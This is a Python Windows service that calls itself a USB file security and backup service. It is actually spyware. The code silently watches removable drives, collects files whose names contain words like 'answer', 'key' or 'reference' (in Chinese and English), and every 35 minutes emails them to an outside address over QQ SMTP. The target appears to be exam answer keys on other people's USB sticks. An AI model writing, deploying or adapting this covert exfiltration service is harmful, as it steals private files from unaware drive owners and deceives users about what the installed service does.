import servicemanager
import win32event
import win32service
import win32serviceutil
import os
import smtplib
import psutil
import fnmatch
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders
from datetime import datetime, timedelta
import time


# 服务设置
class USBFileService(win32serviceutil.ServiceFramework):
    _svc_name_ = 'USBFileService'
    _svc_display_name_ = 'USB文件安全检测服务'
    _svc_description_ = '安全地检测USB中的文件并进行实时备份'

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.running = True
        self.check_interval = 5  # 检查间隔5秒
        self.send_interval = 2100  # 发送间隔35分钟
        self.email_address = '你的QQ邮箱地址'
        self.email_password = '你的QQ邮箱授权码'
        self.to_email = '你想要发送的邮箱'
        self.subject = 'Detected USB Files'
        self.body = 'Attached are the files detected from the USB device.'
        self.search_keywords = ['参考', '答案', 'Answer', 'Key']

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
        self.running = False

    def SvcDoRun(self):
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_, ''))
        self.main()

    def main(self):
        next_send_time = datetime.now()
        while self.running:
            current_time = datetime.now()
            if current_time >= next_send_time:
                files = self.check_usb_and_search_files()
                if files:
                    print(f"Found files: {files}")
                    self.send_email(files)
                    next_send_time = current_time + timedelta(seconds=self.send_interval)
                else:
                    print("No matching files found.")
            time.sleep(self.check_interval)
            if win32event.WaitForSingleObject(self.hWaitStop, self.check_interval * 1000) == win32event.WAIT_OBJECT_0:
                break

    def check_usb_and_search_files(self):
        files_to_send = []
        partitions = psutil.disk_partitions()
        for partition in partitions:
            if 'removable' in partition.opts:
                files_to_send.extend(self.search_files_in_usb(partition.mountpoint, self.search_keywords))
        return files_to_send

    def send_email(self, files):
        msg = MIMEMultipart()
        msg['From'] = self.email_address
        msg['To'] = self.to_email
        msg['Subject'] = self.subject
        msg.attach(MIMEText(self.body, 'plain'))
        for file_path in files:
            part = MIMEBase('application', 'octet-stream')
            with open(file_path, 'rb') as file:
                part.set_payload(file.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment', filename=os.path.basename(file_path))
            msg.attach(part)
        with smtplib.SMTP_SSL('smtp.qq.com', 465) as server:
            server.login(self.email_address, self.email_password)
            server.sendmail(self.email_address, self.to_email, msg.as_string())

    def search_files_in_usb(self, drive_path, keywords):
        matching_files = []
        for root, dirs, files in os.walk(drive_path):
            for filename in files:
                found = False
                for keyword in keywords:
                    if fnmatch.fnmatch(filename, f'*{keyword}*') and os.path.join(root, filename) not in matching_files:
                        matching_files.append(os.path.join(root, filename))
                        found = True
                        break
                if found:
                    break
        return matching_files


if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(USBFileService)
